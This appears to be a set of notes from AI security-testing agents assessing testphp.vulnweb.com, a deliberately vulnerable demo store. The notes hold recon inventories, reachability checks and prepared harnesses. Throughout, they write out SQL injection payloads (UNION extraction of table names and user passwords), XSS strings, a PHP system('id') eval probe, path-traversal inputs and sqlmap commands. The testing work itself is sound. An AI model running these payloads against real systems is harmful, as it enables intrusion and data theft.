675f46.title: testphp.vulnweb.com attack-surface inventory
675f46.content:
## testphp.vulnweb.com — Attack-Surface Inventory (black-box recon)

**Author:** Lean Surface Mapper. **Target:** https://testphp.vulnweb.com (demo Acunetix "Home of Acunetix Art" PHP art-store).

### ⚠️ Live reachability status (IMPORTANT)
The live host was **NOT reachable** from the assessment sandbox at recon time:
- DNS resolves: `testphp.vulnweb.com -> 44.228.249.3` (ec2-44-228-249-3.us-west-2.compute.amazonaws.com, AWS us-west-2).
- All HTTP(S) attempts failed: proxy returns Caido `502 Bad Gateway` with cause `Timeout` (~10 s), and direct (no-proxy) `curl` times out after 20 s. `nmap -p 80,443` reports both **filtered**. No response has ever been captured in proxy history for this host (all `response: null`).
- Therefore the endpoint/parameter inventory below is derived from the **Wayback Machine archive** (CDX + timestamped snapshots) plus a previously recovered archived HTML set. Treat existence/params as **strongly indicated but not live-confirmed**. Live re-validation is required when the host is reachable.

### Technology fingerprint
- **PHP** application (server-side), template `Templates/main_dynamic_template.dwt.php` (Dreamweaver-style `.dwt.php`).
- **MySQL** backend; database name **`acuart`**, tables **`users`** (columns: `uname, pass, cc, email, address, phone, cart, name`), **`categ`** (`cat_id, cdesc, cname`), **`artists`, `pictures`, `products`**.
- HTML 4.01 Transitional, `charset=iso-8859-2`, `style.css`. Branded "Acunetix" (deliberately vulnerable demo).
- Verbose PHP errors enabled (see below).

### Confirmed-existing endpoints (archived 200)
Core pages: `/`, `/index.php`, `/categories.php`, `/artists.php`, `/listproducts.php`, `/product.php`, `/cart.php`, `/guestbook.php`, `/login.php`, `/login` (rewrite), `/logout.php`, `/signup.php`, `/userinfo.php`, `/search.php`, `/comment.php`, `/disclaimer.php`, `/privacy.php`, `/404.php`.

AJAX group (`/AJAX/`): `index.php`, `artist(s).php`, `categories.php`, `infoartist.php`, `infocateg.php`, `infotitle.php`, `titles.php`, `showxml.php`, `styles.css`, `htaccess.conf`.

Mod_Rewrite_Shop group (`/Mod_Rewrite_Shop/`): `index.php`, `details.php`, `buy.php`, `rate.php`, `BuyProduct-{1,2,3}/`, `Details/<product>/<id>/`, `RateProduct-{1,2,3}.html`, `images/{1,2,3}.jpg`, `.htaccess`.

HPP test group (`/hpp/`): `index.php`, `params.php`, `test.php`.

### Parameters / inputs (per endpoint)
- **`listproducts.php?cat=`** — category selector (dynamic; heavily fuzzed). Also seen with `?artist=`.
- **`artists.php?artist=`** — artist selector (dynamic).
- **`product.php?pic=`** — product/picture selector (dynamic). Also observed `pic=3&...`.
- **`showimage.php?file=`** — image/file parameter (candidate path traversal / LFI).
- **`AJAX/infoartist.php?id=`**, **`AJAX/infocateg.php?id=`**, **`AJAX/infotitle.php?id=`** — id lookups (dynamic, SQL-backed).
- **`AJAX/showxml.php`** — returns `not an xml!` (XML handler; `?id=`/xml input likely).
- **`comment.php`** — `POST` form `fComment`: fields `name`, `comment`, `Submit`, hidden `phpaction` (`echo $_POST[comment];`); also `?aid=` (article/artist id).
- **`search.php?test=query`** — `POST` form: `searchFor`, `goButton` (reflected search).
- **`guestbook.php`** — comment/guestbook submission form (fields inferred: name/comment; stored XSS surface).
- **`login.php`** — login form (`un`, `pass`; demo creds `test`/`test` widely published — unverified). `signup.php` → `POST /secured/newuser.php` with `uuname, upass, upass2, urname, ucc, uemail, uphone, uaddress, signup`.
- **`userinfo.php`** — profile view (auth-gated; IDOR surface).
- **`cart.php`** — cart add/update (params inferred; `?id=`/qty).
- **`hpp/*`** — `pp`, `p`, `aaaa/` (HTTP parameter pollution test harness).
- **`index.php?cmd=`** — an archived hit `/?cmd=<?php system('id'); ?>` returned 200 (candidate command/code eval surface — HIGH interest).
- Misc params seen in CDX: `id, cat, artist, pic, file, aid, user, pid, p, pp, trk, url, redirect, redirecturl, page, input, source, gt`.

### Sensitive / high-interest exposed paths (archived/listed)
- **`/.idea/`** — JetBrains project config: `.name, acuart.iml, encodings.xml, misc.xml, modules.xml, scopes/scope_settings.xml, vcs.xml, workspace.xml` (source/project metadata leak).
- **`/Connections/DB_Connection.php`** — DB connection include (credentials if readable).
- **`/CVS/`** — `Entries, Entries.Log, Repository, Root` (CVS metadata / source leak).
- **`/admin/`**, **`/admin/create.sql`** — admin dir + DB schema dump.
- **`/_mmServerScripts/MMHTTPDB.php`**, **`/_mmServerScripts/mysql.php`** — Dreamweaver MySQL admin scripts (classic RCE/DB surface).
- **`/index.bak`**, **`/index.zip`**, **`/Mod_Rewrite_Shop/RateProduct-1.bak.html`** — backup/source artifacts.
- **`/bxss/`** — blind-XSS test dir: `index.php, vuln.php, cleanDatabase.php, database_connect.php, test.js, adminPan3l/index.php, adminPan3l/style.css`.
- **`/crossdomain.xml`**, **`/clientaccesspolicy.xml`** — Flash/Silverlight policy files.
- **`/AJAX/htaccess.conf`**, **`/Mod_Rewrite_Shop/.htaccess`** — Apache config exposure.
- **`/images/`**, `/images/logo.gif`, `/images/remark.gif`, `/favicon.ico`, `/dot.gif`.

### Cookies / verbose errors
- **Set-Cookie:** not observed (no live response captured). Expected PHP session cookie after `login.php`.
- **Verbose error disclosure (archived, confirmed in captured HTML):**
  - `AJAX/infoartist.php` → `Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infoartist.php on line 7` — leaks **server filesystem path** `/hj/var/www/` and DB error handling.
  - `AJAX/infotitle.php` → `Notice: Undefined index: id in /hj/var/www/AJAX/infotitle.php on line 5` + same mysql warning.
- **Directory listing:** not directly confirmed (archive only); `/admin/`, `/images/`, `/_mmServerScripts/` worth re-checking live.

### Ranked candidate injection surfaces (recon hypothesis — NOT exploited)
1. **SQLi — `listproducts.php?cat=`, `artists.php?artist=`, `product.php?pic=`, `AJAX/infoartist.php?id=`** (highest). CDX confirms repeated historical `UNION SELECT` / `BENCHMARK` / `INFORMATION_SCHEMA` / boolean-blind (`AND 1=1`) payloads against these exact params; `id` (328 hits) and `cat` (271 hits) are the most-fuzzed. Numeric + string contexts likely.
2. **SQLi — `comment.php?aid=`, `index.php?%id%`, `Mod_Rewrite_Shop/details.php?id=`, `buy.php?id=`** (medium). Archived `UNION SELECT ... information_schema` and `EXTRACTVALUE` payloads returned 200.
3. **RCE / code eval — `index.php?cmd=`** — archived `?cmd=<?php system('id'); ?>` hit returned 200 (needs live confirmation; could be cache artifact).
4. **Reflected XSS — `search.php` (`searchFor`, `test`), `listproducts.php?artist=<script>`, `hpp/params.php` (`p=<scRipt>`, `pp=" onmouseover=`)**. Archived `<script>alert(..)` payloads returned 200.
5. **Stored XSS — `guestbook.php`**, **`comment.php`** (`name`/`comment` written to DB then re-rendered; `comment.php` hidden field literally echoes `$_POST[comment]`).
6. **Path traversal / LFI — `showimage.php?file=`, `product.php?pic=`, `index.php?cmd=`** with `../../etc/passwd`, `php://filter` (candidate; not confirmed).
7. **Info disclosure — `.idea/`, `/CVS/`, `/admin/create.sql`, `/Connections/DB_Connection.php`, `_mmServerScripts/`, `*.bak`, verbose PHP warnings**.
8. **Broken auth / IDOR — `login.php`, `userinfo.php`, `cart.php`, `signup.php`, `AJAX/*?id=`** (demo creds `test`/`test`; `users` table stores `cc` credit-card-like data).

### Raw evidence snippets
```
AJAX/infoartist.php (archived body):
<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infoartist.php on line 7
</iteminfo>

AJAX/infotitle.php (archived body):
Notice: Undefined index: id in /hj/var/www/AJAX/infotitle.php on line 5
<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infotitle.php on line 7
</iteminfo>

comment.php form (archived):
<form action="comment.php" method="post" ... name="fComment" id="fComment">
  <input name="name" type="text" id="name" value="<your name here>" size="25">
  <input ... name="comment">
  <input type="hidden" name="phpaction" value="echo $_POST[comment];">

index.php search form (archived):
<form action="search.php?test=query" method="post">
  <input name="searchFor" type="text" size="10">
  <input name="goButton" type="submit" value="go">

signup.php form action:
<form name="form1" method="post" action="/secured/newuser.php">
  uuname, upass, upass2, urname, ucc, uemail, uphone, uaddress, signup

CDX historical payloads (examples, HTTP 200):
/AJAX/infoartist.php?id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x...,(SELECT (ELT(...=...,1))),0x...,0x78))s), ...)))-- Kial
/artists.php?%20artist=1-SLEEP(3
/comment.php?aid=' UNION SELECT * FROM information_schema --
/hpp/params.php?aaaa/=?p=<scRipt>alert(0x107E91
/product.php?pic=3&hkNi=3073 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema
/?cmd=<?php system('id'); ?>
```

### Caveats
- Recovered via Wayback Machine (archive) because the live host was unreachable; archive timestamps span 2012–2026. Some CDX entries are third-party scanner traffic and may not represent current app behavior.
- No exploit payloads were sent to the live target (recon only). All "candidate" items are hypotheses for the validation phase.

5438a1.content:
As of ~20:57-21:0x UTC, https://testphp.vulnweb.com (A=44.228.249.3, AWS us-west-2) is unreachable:
- Sandbox direct egress to :80 and :443: connection timed out (25s).

Other agents: /workspace/recon (parent recon) has archived pages under pages/ and pages2/.

8898be.title: BLOCKER: testphp.vulnweb.com origin is DOWN / unreachable (all egress paths)
8898be.content:
**Status: target unreachable — no live (dynamic) testing possible as of 2026-09-20 ~21:00 UTC.**

`https://testphp.vulnweb.com` (A record `44.228.249.3`, AWS us-west-2, DNS consistent across 8.8.8.8/1.1.1.1/9.9.9.9, no AAAA) does not accept TCP on 80/443.

Evidence (multiple independent networks/timeouts):
- Caido proxy (the sandbox egress): HTTP/HTTPS -> `502` with cause `Timeout` (~10s), every attempt (16+ retries over ~10 min by recon agent + my retries).
- Direct from container: `curl --noproxy '*'` -> code `000`; raw SYN -> `nmap -Pn -p80,443` reports `filtered` / reason `no-response`.
- Third-party server-side fetchers (independent networks), all confirm origin is unreachable **while the same fetcher succeeds against `example.com` (positive control)**:
  - `r.jina.ai/https://testphp.vulnweb.com/` -> `422` TimeoutError (control `example.com` -> `200` in 0.7s)
  - Google translate proxy `testphp-vulnweb-com.translate.goog` -> `408` timeout
  - `web.archive.org/save/...` (Save Page Now) -> `502` Timeout
  - `api.codetabs.com` proxy -> `522`; `allorigins` -> `408`
- Sandbox general egress is healthy: `example.com` direct+proxy = 200, `s3.us-west-2.amazonaws.com` = 307. So this is target-specific, not a sandbox network fault.
- No Wayback Machine captures since **2026-03-11** (~6 months stale); latest snapshot Jan-Mar 2026.

**Implication for the scan:** all endpoints below are `needs_follow_up` (open proof gap) — none could be dynamically tested. Archived (Wayback) copies exist for static structure only and cannot demonstrate server-side auth/session/IDOR behavior. Recommend: re-run auth/access-control testing once the origin is reachable again.

Archived structure (from Wayback, informational only, UNVERIFIED against live target):
- `login.php` -> form POSTs to `userinfo.php` with fields `uname`/`pass`; page states signup disabled, use `test`/`test`.
- `signup.php` -> form POSTs to `/secured/newuser.php` with `uuname`, `upass`, `upass2`, `uemail`, `urname`, `uphone`, `ucc` (fixed field set; no role field visible in HTML).
- `cart.php` (input `movie`), `userinfo.php`, `guestbook.php`, `comment.php` (hidden `phpaction` echoes `$_POST[comment]`), `AJAX/index.php` (+ `loadSomething()` AJAX, `setcookie` in JS), `AJAX/infoartist.php`, `search.php?test=query`.
- No CSRF token visible in archived login/signup/cart/comment forms (UNVERIFIED live).

ee5fad.title: Traversal/upload/disclosure — reachability blocker + ready harness
ee5fad.content:
## Path traversal / LFI, file upload, information disclosure — status

**Author:** Traversal & Disclosure Hunter. **Target:** https://testphp.vulnweb.com

### Reachability (blocker, re-confirmed)
Independently re-verified the host is **unreachable from the assessment sandbox**, so no
traversal/LFI/upload/disclosure probe could be executed against live target code.

- DNS: `testphp.vulnweb.com -> 44.228.249.3` (AWS us-west-2), single A record, no AAAA.
- Proxy egress is healthy in general (`https://example.com` -> 200 in 0.09 s), so this is
  target-specific, not a broken proxy.
- Every request to the host returns the proxy's own error page
  (`502`, 8960 B, `<title>Caido</title>`, cause `Timeout`) after exactly ~10 s.
  That page is a **proxy/client error, not target behaviour**.
- 12 sequential attempts over ~2.5 min: all `502` timeouts. Repeat attempts: `--http1.0`,
  `--http2`, `--tlsv1.2`, HEAD, plain `http://`, and `https://<IP>/` all time out identically.
- Raw proxy tunnel test: `CONNECT host:443` -> `200 OK` and `CONNECT host:80` -> `200 OK`
  (proxy accepts), but the proxied HTTP response is the 10 s-timeout error on both ports ->
  the stall is the proxy's outbound connection to the target, not TLS/HTTP negotiation.
- Port sweep through the proxy (80, 443, 8080, 8443, 8000, 8008, 8888, 3000, 22): all timeout.
- `repeat_request` (Caido replay) of a captured request: "did not complete within 30s".

### Harness prepared (runs instantly when the host returns)
`/workspace/trav/probe.py` — reachability pre-check with fast-fail, then:
- **Traversal/LFI**: differential baseline-vs-payload sweep over `showimage.php?file=`,
  `product.php?pic=`, `index.php?cmd=`, `listproducts.php?cat=`, `artists.php?artist=`,
  `AJAX/showxml.php?id=` using `../../../../etc/passwd`, `....//`, `..%2f`, `%2e%2e%2f`,
  double-encoding, absolute `/etc/passwd`, null-byte variants, and `php://filter`
  base64 wrappers. Proof rule: real out-of-root bytes (`root:...:0:0:`) absent from the
  in-root control; proxy error pages are filtered out and never counted.
- **Info disclosure**: `phpinfo.php`, `.git/HEAD|config`, `.env`, `.htaccess`,
  `Connections/DB_Connection.php`, `admin/create.sql`, `_mmServerScripts/*`,
  `.idea/workspace.xml`, `CVS/*`, `index.bak`/`.zip`, `robots.txt`, `sitemap.xml`,
  `crossdomain.xml`, dir-listing check on `/images/`, `/admin/`, `/secured/`.
- **Upload surface**: scans mapped pages for `multipart/form-data` / `<input type=file>`.

Run: `python3 /workspace/trav/probe.py` (exit 2 = unreachable).

### Nothing was confirmed or ruled out
No live probe ran, so no traversal, upload, or disclosure result is `ruled_out` —
all remain `open_proof_gap` with the specific gap being target unreachability.
Historic/archived hints (e.g. `showimage.php?file=`, `/Connections/DB_Connection.php`,
`/index.bak`, `/.idea/`, `/CVS/`, verbose PHP warnings leaking `/hj/var/www/`) are
hypotheses for live re-testing only and are **not** reportable without live evidence.

4d1e7e.title: REACHABILITY: testphp.vulnweb.com is UNREACHABLE (globally down)
4d1e7e.content:
# Verdict: UNREACHABLE — no working route from this environment or globally

Target: https://testphp.vulnweb.com -> 44.228.249.3 (AWS us-west-2). DNS is healthy; the host is DOWN/FILTERED.

## Evidence (exact commands + outputs)

### 1. DNS (consistent, single A, no AAAA)
```
dig +short testphp.vulnweb.com A          -> 44.228.249.3
dig +short @8.8.8.8 testphp.vulnweb.com A -> 44.228.249.3
dig +short @1.1.1.1 testphp.vulnweb.com A -> 44.228.249.3
getent ahosts testphp.vulnweb.com         -> 44.228.249.3 STREAM
dig +short testphp.vulnweb.com AAAA       -> (empty)
```

### 2. TCP from sandbox (both direct and via Caido proxy) — TIMEOUT
```
$ nc -zv -w5 44.228.249.3 80    -> Connection timed out
$ nc -zv -w5 44.228.249.3 443   -> Connection timed out

$ env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY \
    curl -sv --max-time 40 https://testphp.vulnweb.com/
  *   Trying 44.228.249.3:443...
  * Connection timed out after 40004 milliseconds   <- fails at CONNECT stage, no TLS

$ curl -sS --max-time 35 -o /dev/null \
    -w 'dns=%{time_namelookup} connect=%{time_connect} appconnect=%{time_appconnect} starttransfer=%{time_starttransfer} total=%{time_total} code=%{http_code}\n' \
    https://testphp.vulnweb.com/
  dns=0.000035 connect=0.000143 appconnect=0.011994 starttransfer=10.014672 total=10.014723 code=502
  (connect/appconnect here are to the LOCAL Caido proxy 127.0.0.1:48080; Caido then returns 502 cause=Timeout)
```

### 3. Port scan — ZERO open ports
```
$ nmap -n -Pn -T4 --top-ports 100 --open 44.228.249.3   -> no open ports
$ nmap -n -Pn -T4 -p 1-1024 --open 44.228.249.3         -> no open ports (104s)
$ nmap -n -Pn -T4 -p 8080,8443,8000,8081,8888,3000,5000,9000 --open 44.228.249.3 -> no open ports
```

### 4. Alternate ports via curl --resolve — all TIMEOUT
```
curl  -k --resolve testphp.vulnweb.com:8080:44.228.249.3 http://...:8080/  -> timed out 12s
curl  -k --resolve testphp.vulnweb.com:8443:44.228.249.3 https://...:8443/ -> timed out 12s
curl  -k --resolve testphp.vulnweb.com:8000:44.228.249.3 http://...:8000/  -> timed out 12s
curl  -k --resolve testphp.vulnweb.com:80:44.228.249.3   http://...:80/    -> timed out 12s
curl  -k --resolve testphp.vulnweb.com:443:44.228.249.3  https://...:443/   -> timed out 12s
```

### 5. IPv6 — not present
```
curl -6 https://testphp.vulnweb.com/  -> Could not resolve host (no AAAA)
```

### 6. Aliases (reachability probe only, NOT tested for vulns) — same IP, same timeout
```
www.vulnweb.com -> 44.228.249.3 -> timed out on 443
vulnweb.com     -> 44.228.249.3 -> timed out on 443
```

### 7. Egress is NOT the cause (control hosts connect fine)
```
$ env -u http_proxy ... curl https://google.com/          -> code=301 connect=0.0056
$ env -u http_proxy ... curl https://example.com/         -> code=200 connect=0.013
$ env -u http_proxy ... curl https://s3.us-west-2.amazonaws.com/       -> code=307 connect=0.177
$ env -u http_proxy ... curl https://dynamodb.us-west-2.amazonaws.com/ -> code=200 connect=0.183
$ env -u http_proxy ... curl https://ec2.us-west-2.amazonaws.com/      -> code=301 connect=0.172
```
Note: the AWS us-west-2 region itself is reachable, so this is NOT a regional block — it is
this specific host. (The AWS hostname ec2-44-228-249-3.us-west-2.compute.amazonaws.com = same IP also times out.)

### 8. Global multi-node confirmation (check-host.net API) — EVERY node times out
```
$ curl -H 'Accept: application/json' "https://check-host.net/check-tcp?host=testphp.vulnweb.com:443&max_nodes=12"
  request_id=4c863049kcbf
$ curl -H 'Accept: application/json' "https://check-host.net/check-result/4c863049kcbf"
  {"ca1":[{"error":"Connection timed out"}],"es1":[...timed out...],"hk1":[...],"il1":[...],
   "ir6":[...],"it2":[...],"jp1":[...],"ru2":[...],"ru3":[...],"tr2":[...],"ua1":[...],"uk1":[...]}
  => 12/12 nodes report Connection timed out on 443

Port 80 (request 4c8630c3k89a): 12/12 nodes timed out, including us4 (US node):
  ch2, es2, il1, ir6, it2, md1, nl1, ro1, rs1, ua2, uk1, us4 -> all "Connection timed out"
```

### 9. Independent external HTTP fetchers — all fail
```
r.jina.ai   -> "upstream connect error or disconnect/reset before headers. reset reason: connection termination"
api.allorigins.win/raw?url=...  -> HTTP 408 (timeout)
api.codetabs.com/v1/proxy/?quest=... -> HTTP 522 (origin connection timed out)
corsproxy.io -> HTTP 403 (service-side restriction)
```

### 10. Retries spaced ~15-30s apart — identical timeout
```
attempt 1 21:02:24 -> curl (28) Connection timed out 12s
attempt 2 21:02:51 -> curl (28) Connection timed out 12s
attempt 3 21:03:18 -> curl (28) Connection timed out 12s
```

## Conclusion
The origin (44.228.249.3) is globally unreachable — ports 80 and 443 time out from 24 independent
global nodes and from multiple external HTTP proxy/reader services. This is a server-side outage
or upstream filtering of the host, NOT a sandbox egress restriction (google/example/AWS-us-west-2
all connect). There is NO working route: no alternate IPs, no alternate ports, no IPv6, no alias
hostname, no proxy path, and even the sandbox's authenticated-less Caido proxy returns 502 cause=Timeout.

Wayback has a snapshot from 2026-03-04 (status 200) at
http://web.archive.org/web/20260304115032/http://testphp.vulnweb.com/ confirming the site existed
and served content historically — but that is a cached copy, not the live target, and must not be
used as a substitute for testing the deployed application.

## Recommendation for other agents
Do NOT attempt live exploitation of testphp.vulnweb.com — the target is down and every request will
time out (12s direct / 10s via Caido then 502). Re-test reachability later; if/when TCP 443 connects
(verify with `nc -zv 44.228.249.3 443` or `curl -sS -o /dev/null -w '%{http_code}' https://testphp.vulnweb.com/`),
the standard engagement command would be:
  curl -sk https://testphp.vulnweb.com/    (or)    httpx -u https://testphp.vulnweb.com -sc -title -td

f08653.title: XSS hunt status — testphp.vulnweb.com (all surfaces open_proof_gap: target down)
f08653.content: **Author:** XSS Hunter. **Target:** https://testphp.vulnweb.com. **Result: NO XSS confirmed — blocker is target unreachability, not absence of bugs.** ## Reachability (re-confirmed by me) - DNS `testphp.vulnweb.com -> 44.228.249.3` (AWS us-west-2); ports 80/443 `filtered` (nmap no-response); direct curl `000`; Caido proxy `502` cause `Timeout` (~10s) on every attempt from 20:52–21:15 UTC. - Independent external fetchers also fail now: `r.jina.ai` TimeoutError, `api.codetabs.com` 522, `api.allorigins.win` 500, archive.org Save 502/408. -> origin is globally down, not a sandbox issue. - No response for this host has ever been captured in Caido history this run (all `response: null`). ## XSS surfaces assessed (all `needs_follow_up`, live test impossible) - Reflected candidates: `search.php` (`test`,`searchFor`), `listproducts.php?cat/artist`, `artists.php?artist`, `product.php?pic`, `hpp/params.php` (`p`,`pp`,`aaaa/`), `hpp/index.php?pp`, `Mod_Rewrite_Shop/details.php|buy.php|rate.php?id`, `AJAX/infoartist.php|infocateg.php|infotitle.php?id`, `index.php?id|cmd`. - Stored candidates: `guestbook.php` (hidden `name` + `text`), `comment.php` (`name`,`comment`). - DOM candidates: `AJAX/index.php` — static JS review shows `SetContent()`/`SetInfo()` string-concatenate XML values into `innerHTML`, and `xmlCompleted()` does `xd.innerHTML = httpreq.responseText` (data from `showxml.php` / `infoartist.php`). Sources are DB/XML-derived, not directly attacker-controlled, so exploitability depends on an unauthenticated DB-write path (untested). ## Archived evidence gathered (static, not live) - `guestbook.php?name=` snapshot (Wayback 20251103072058, real page 5390B retrieved): the `name` value was **not reflected** in the response — one archived negative data point; not proof, just no reflection seen. - `comment.php?aid=` responses have an identical digest for `aid=1` / `-1` / `'x'` -> `aid` is not reflected in the visible page. - CDX confirms historical scanner URLs with ``, `">` against `Mod_Rewrite_Shop/details.php?id=`, `hpp/params.php?p=`, `product.php?pic=`, `listproducts.php?cat=` (all 200 at the time) — **hypotheses only, no archived response body with the reflection context was retrievable** (Wayback bot-flagged/rate-limited). ## Ready to fire when the host returns - `/workspace/xss/harness.py` — canary-based reflected-XSS sprayer over all GET/POST points above, with context classification (html-text / attribute-quoted / attribute-unquoted / script) and Caido-error filtering. Fast-fails if unreachable. - `/workspace/xss/monitor_and_run.sh` — background poller that runs the harness automatically the moment the host answers `200`, writing `/workspace/xss/live_result.txt` and touching `/workspace/xss/LIVE_READY`. ## Conclusion No reflected/stored/DOM XSS could be confirmed or ruled out. All XSS surfaces remain **open_proof_gap** with the single gap = live origin unreachable. Re-run `python3 /workspace/xss/harness.py` + an agent-browser execution check when `https://testphp.vulnweb.com/` responds.

68179f.title: Archived-evidence SQLi candidates (UNCONFIRMED) — listproducts.php?cat=, artists.php?artist=
68179f.content:
Target https://testphp.vulnweb.com is globally DOWN at assessment time (sandbox direct, Caido proxy/replay, 3 external fetchers, and check-host.net from 6 countries all time out). No live HTTP responses were ever captured for this host in the shared proxy history. STATUS / DECISION (per root-agent direction): no vulnerability report was filed for these candidates, because exploitability could not be reproduced against a live target and the only supporting material is historical archive data. Treat these as UNCONFIRMED candidates (needs_follow_up), not as reported findings. Because live probing is impossible, the injectability was characterised against the Wayback Machine's archived RAW responses from the SAME target (id_ snapshots), which contain the application's own SQL error output and injected data. PRIMARY #1 — listproducts.php?cat= (MySQL, string/numeric, unescaped) - Archived snapshot (ts 20230514050754) of: http://testphp.vulnweb.com/listproducts.php?cat=123' Body content region: Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74 - ORDER BY boundary captured in archive: cat=2 order by 11-- (ts 20170512010921) -> normal listing (=11 columns OK) cat=2 order by 12-- (ts 20170515093925) -> Error: Unknown column '12' in 'order clause' => query has 11 columns; parameter is concatenated into the query (injectable ORDER BY/WHERE context). - Arithmetic eval: cat=2-1 (ts 20241223060008) renders category "Posters" (cat 1); baseline cat=2 renders "Paintings". PRIMARY #2 — artists.php?artist= (MySQL, unescaped) - Archived snapshot (ts 20260211111051) of: http://testphp.vulnweb.com/artists.php?artist=' Body: Error: You have an error in your SQL syntax; ... right syntax to use near ''' at line 1 - UNION data extraction captured in archive (ts 20210602180839): http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, table_name, 3 from information_schema.tables WHERE table_schema = database()... Rendered page:

artist: artists

...

3

=> injected table_name ("artists") + literal 3 were reflected -> UNION-based extraction works. - Injection attempt (ts 20210602180530) artists.php?artist=-1 union select 1, group_concat(pass), 3 from users -> mysql_fetch_array() warning at /hj/var/www/artists.php on line 62 (query executed and returned false) SECONDARY — AJAX/infoartist.php?id= : archived responses show mysql_fetch_array() boolean-given warnings in /hj/var/www/AJAX/infoartist.php line 7 and infotitle.php line 5 (query built from $_GET[id]); candidate, not yet demonstrating extraction. DB context: schema name "acuart"; app path /hj/var/www ; tables incl. users/categ/artists. Raw archived bodies saved in /workspace/sqli_hunt/wbpages and wbpages2 (local scratch). Public evidence is the Wayback id_ URLs above. Wrap-up: live retries halted per root direction.

56aeaa.title: testphp SQLi — live PoC harness + blocker (host down)
56aeaa.content:
Status: SQLi discovery on testphp.vulnweb.com could NOT be confirmed with a live PoC — the host is globally unreachable for the entire scan (direct egress timeout to 44.228.249.3:80/443; Caido proxy fixed ~10s timeout -> 502; Caido Replay 30s timeout; api.allorigins.win/api.codetabs.com/r.jina.ai fail; check-host.net nodes AT/BG/CA/IR/RU/UA time out). No request in shared Caido history ever returned a response.

Per root-agent direction: no vulnerability report filed (archived-only evidence).

READY-TO-RUN LIVE HARNESS (execute the instant the host answers):
1) Baseline vs boolean/arithmetic:
   curl -s 'https://testphp.vulnweb.com/listproducts.php?cat=2'                      # expect "Paintings"
   curl -s 'https://testphp.vulnweb.com/listproducts.php?cat=2-1'                    # expect "Posters" if arithmetic evaluated
   curl -s 'https://testphp.vulnweb.com/listproducts.php?cat=2%20order%20by%2011--'  # no error (11 cols)
   curl -s 'https://testphp.vulnweb.com/listproducts.php?cat=2%20order%20by%2012--'  # SQL error "Unknown column '12'"
   curl -s "https://testphp.vulnweb.com/listproducts.php?cat=2'"                     # SQL syntax error near '''
2) artists.php:
   curl -s "https://testphp.vulnweb.com/artists.php?artist='"                        # SQL syntax error
   curl -s 'https://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name,3%20from%20information_schema.tables%20WHERE%20table_schema=database()--'  # expect artist name = a table_name
3) sqlmap (via Caido proxy env):
   sqlmap -u 'https://testphp.vulnweb.com/listproducts.php?cat=2' -p cat --batch --level 3 --risk 2 --current-db --flush-session
   sqlmap -u 'https://testphp.vulnweb.com/artists.php?artist=1' -p artist --batch --level 3 --risk 2 --current-db --flush-session
   sqlmap -u 'https://testphp.vulnweb.com/login.php' --data 'un=1&pass=1' -p un,pass --batch --level 3 --risk 2
   sqlmap -u 'https://testphp.vulnweb.com/product.php?pic=1' -p pic --batch --level 3 --risk 2
   sqlmap -u 'https://testphp.vulnweb.com/AJAX/infoartist.php?id=1' -p id --batch --level 3 --risk 2
Note: Caido upstream timeout is ~10s; a live origin normally answers well within that.

Archived evidence (Wayback id_ raw) gathered before wrap-up is in /workspace/sqli_hunt/wbpages* and summarized in findings note 68179f.
